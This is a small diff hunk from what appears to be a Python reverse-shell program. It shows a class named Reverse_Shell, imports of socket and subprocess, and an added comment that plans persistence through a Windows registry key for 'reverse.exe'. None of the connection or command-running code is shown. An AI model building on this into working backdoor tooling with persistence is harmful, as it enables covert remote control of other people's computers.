@@ -2,7 +2,12 @@ import socket
 import subprocess
 import json
 import time
+import os
+import sys
 
+# for persistance:
+    # go to the registry on windows
+    # create a registry key on the user for the reverse.exe
 
 class Reverse_Shell:
     global sock
